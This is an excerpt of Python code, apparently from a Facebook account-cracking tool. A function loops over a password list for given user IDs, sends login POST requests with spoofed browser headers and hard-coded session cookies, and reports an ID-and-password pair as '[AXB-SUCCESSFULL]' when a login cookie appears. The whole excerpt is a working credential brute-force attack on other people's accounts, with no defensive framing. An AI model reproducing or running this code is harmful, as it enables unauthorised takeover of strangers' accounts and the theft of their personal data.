...
def method3(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            r = requests.Session()
            url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {"authority": 'web.facebook.com',
                    "method": 'POST',
                    "path": '/ajax/bz?__a=1&__ccg=GOOD&__comet_req=0&__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5MKdwnU1oU884y0lW0ny0RE2Jw8W0iW0lK3qaw4kwbS1Lw4Cw&__hs=19347.BP%3ADEFAULT.2.0.0.0.0&__hsi=7179474328938778982&__req=1&__rev=1006767099&__s=31lc1i%3Agsd93l%3Aiq4d0v&__spin_b=trunk&__spin_r=1006767099&__spin_t=1671601629&__user=0&dpr=1&jazoest=2948&lsd=AVrQlwFZGOA',
                    "scheme": 'https',
                    "accept": '*/*',
                    "accept-encoding": 'gzip, deflate, br',
                    "accept-language": 'en-US,en;q=0.9',
                    "content-length": '2291',
                    "content-type": 'multipart/form-data; boundary=----WebKitFormBoundaryEof4ym5z5ByPwedZ',
                    "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ; sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; wd=433x620; fr=0o33F1l1VPIOu5DzG.AWXdzskaDZb6dQHlSDUBm2TUzms.BjizHk.uB.AAA.0.0.Bjop3d.AWUqpjlHTYg',
            ...
            hed2 = {"authority": 'web.facebook.com',
                    "method": 'POST',
                    ...
                    "viewport-width": '433',
                    "x-fb-lsd": 'dpfGTU_h6i7RZ9adHGot9-',}
            next = r.post("https://web.facebook.com/?_rdc=1&_rdr",data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[AXB-SUCCESSFULL] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
